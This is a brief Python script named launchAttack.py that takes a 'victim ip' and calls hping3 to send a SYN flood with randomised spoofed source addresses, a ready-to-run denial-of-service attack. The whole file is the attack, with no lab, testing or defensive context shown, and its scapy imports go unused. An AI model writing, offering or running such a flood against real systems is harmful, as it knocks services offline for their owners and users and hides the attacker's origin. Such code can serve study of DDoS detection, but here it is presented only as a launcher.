import sys
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from os import popen
from scapy.all import sendp, IP, UDP, Ether
from random import randint
from argparse import ArgumentParser
import subprocess

def main(dst_ip):
    
    if(dst_ip is None):
        print('Type the following command to get some help\npython3 launchAttack.py --h')
        exit(0)
    subprocess.call(["hping3",dst_ip,"--flood","-S","-V","--rand-source"])

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--dst_ip', type=str, help='The victim ip of DDOS attack.')
    args = parser.parse_args()
    main(**vars(args))